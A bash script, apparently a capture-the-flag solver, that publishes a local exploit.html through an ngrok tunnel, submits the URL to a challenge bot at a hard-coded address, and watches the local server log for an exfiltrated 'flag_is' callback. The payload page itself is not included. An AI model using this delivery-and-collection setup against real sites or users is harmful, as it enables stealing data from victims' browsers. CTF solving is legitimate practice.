#!/bin/bash
cd "$(dirname "$0")"
PORT=8777
pkill -f "http.server $PORT" 2>/dev/null
pkill -f "ngrok http" 2>/dev/null
pkill -f "cloudflared tunnel" 2>/dev/null
rm -f srv.log ng.log

python3 -m http.server $PORT --bind 127.0.0.1 > srv.log 2>&1 &
SRV=$!
sleep 1

ngrok http $PORT --log=stdout > ng.log 2>&1 &
NGPID=$!

echo "[*] Initializing Ngrok tunnel..."
URL=""
for i in $(seq 1 15); do
  URL=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -aoE 'https://[a-z0-9.-]+\.ngrok-free\.dev' | head -1)
  [ -n "$URL" ] && break
  sleep 1
done

if [ -z "$URL" ]; then
  echo "[-] NGROK FAILED:"
  cat ng.log
  kill $SRV $NGPID 2>/dev/null
  exit 1
fi

echo "[+] Ngrok Tunnel URL: $URL"
TARGET="$URL/exploit.html"

echo "[*] Checking reachability: $TARGET ..."
code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 "$TARGET")
echo "[*] HTTP status: $code"
if [ "$code" != "200" ]; then
  echo "[-] Target not reachable (HTTP $code), aborting."
  kill $SRV $NGPID 2>/dev/null
  exit 1
fi

echo "[+] Reachable! Submitting URL to challenge bot (113.20.103.216:31337) ..."
python3 - "$TARGET" <<'EOF'
import socket, sys, time

url = sys.argv[1]
print(f"[*] Connecting to challenge service ...")
s = socket.create_connection(("113.20.103.216", 31337), 30)
s.settimeout(90)

buf = b""
while b"URL to visit" not in buf:
    d = s.recv(4096)
    if not d:
        break
    buf += d
print(f"[*] Bot: {buf.decode(errors='replace').strip()}")

print(f"[*] Sending URL: {url}")
s.sendall((url + "\n").encode())

t0 = time.time()
while time.time() - t0 < 65:
    d = s.recv(4096)
    if not d:
        break
    sys.stdout.write(d.decode(errors="replace"))
    sys.stdout.flush()
s.close()
EOF

echo
echo "=== Checking exfiltrated flag in srv.log ==="
grep -a 'flag_is' srv.log || echo "[-] No flag_is callback seen yet."

echo "=== All Server Requests ==="
cat srv.log

kill $SRV $NGPID 2>/dev/null
